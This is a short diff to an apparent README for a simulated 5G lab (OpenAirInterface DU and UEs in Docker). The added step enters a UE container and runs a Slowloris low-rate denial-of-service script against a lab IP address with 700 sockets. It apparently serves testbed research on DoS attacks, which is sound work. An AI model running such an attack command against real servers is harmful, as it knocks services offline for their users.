@@ -27,6 +27,11 @@
 5. RUN the OAI-DU and OAI-NR-UEs
     ```bash
     ./run-du-ues.sh
+
+    ## run the ue attack
+    docker exec -it rfsim5g-oai-nr-ue bash
+    cd etc/lowRateDoS
+    python3 slowloris.py 192.168.71.135 -S 10.0.0.2 -s 700
     ```
 
 
